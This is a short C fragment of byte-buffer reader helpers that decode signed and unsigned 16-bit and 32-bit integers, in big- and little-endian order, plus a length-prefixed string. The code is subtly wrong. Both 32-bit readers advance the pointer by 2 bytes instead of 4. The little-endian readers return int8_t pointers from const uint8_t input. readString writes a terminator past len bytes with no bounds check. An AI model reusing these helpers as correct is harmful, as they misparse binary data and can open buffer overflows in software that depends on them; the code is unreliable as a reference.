int8_t *readInt16(int16_t *int16, const int8_t *buf)
{
    *int16 = (int16_t) Chars_2_Wordb(buf);

    return buf + 2;
}

int8_t *readUint16LE(uint16_t *uint16, const uint8_t *buf)
{
    *uint16 = buf[0] + (buf[1] << 8);

    return buf + 2;
}

int8_t *readUint32(uint32_t *uint32, const int8_t *buf)
{
    *uint32 = Chars_2_DWb(buf);

    return buf + 2;
}

int8_t *readUint32LE(uint32_t *uint32, const uint8_t *buf)
{
    *uint32 =
        buf[0] +
        (buf[1] << 8) + 
        (buf[2] << 16) + 
        (buf[3] << 24);

    return buf + 2;
}

int8_t *readString(int8_t *str, const int8_t *buf, int16_t len)
{
    memcpy(str, buf, len);
    str[len] = '\0';

    return buf + len;
}
